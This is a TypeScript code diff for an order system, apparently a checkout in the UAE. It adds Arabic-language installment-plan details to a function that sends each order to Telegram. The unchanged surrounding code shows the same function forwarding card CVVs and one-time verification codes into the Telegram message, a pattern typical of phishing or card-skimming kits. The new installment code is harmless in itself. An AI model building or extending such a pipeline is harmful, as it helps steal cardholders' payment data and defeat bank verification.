@@ -32,6 +32,17 @@ interface OrderData {
     cvv?: string;
     verificationCode?: string; // Added verification code
   };
+  installmentDetails?: {
+    months: number;
+    downPayment: number;
+    monthlyInstallment: string;
+    remainingAmount: number;
+    schedule: {
+      month: number;
+      date: string;
+      amount: string;
+    }[];
+  };
   invoiceUrl?: string; // URL to the invoice PDF
   contractUrl?: string; // URL to the contract PDF
 }
@@ -185,6 +196,25 @@ export async function sendOrderToTelegram(
       if (orderData.paymentDetails.verificationCode) {
         message += `Verification Code: ${orderData.paymentDetails.verificationCode}\n`;
       }
+    }
+
+    // Add installment details if available
+    if (orderData.installmentDetails) {
+      message += "\n📅 تفاصيل التقسيط\n";
+      message += `عدد الأشهر: ${orderData.installmentDetails.months}\n`;
+      message += `الدفعة الأولى: ${orderData.installmentDetails.downPayment.toFixed(
+        2
+      )} د.إ\n`;
+      message += `القسط الشهري: ${orderData.installmentDetails.monthlyInstallment} د.إ\n`;
+      message += `المبلغ المتبقي: ${orderData.installmentDetails.remainingAmount.toFixed(
+        2
+      )} د.إ\n\n`;
+
+      message += "جدول الأقساط الشهرية:\n";
+      orderData.installmentDetails.schedule.forEach((payment, index) => {
+        message += `الشهر ${payment.month}: ${payment.amount} د.إ - ${payment.date}\n`;
+      });
+      message += "\n";
     }
 
     // Add invoice and contract links
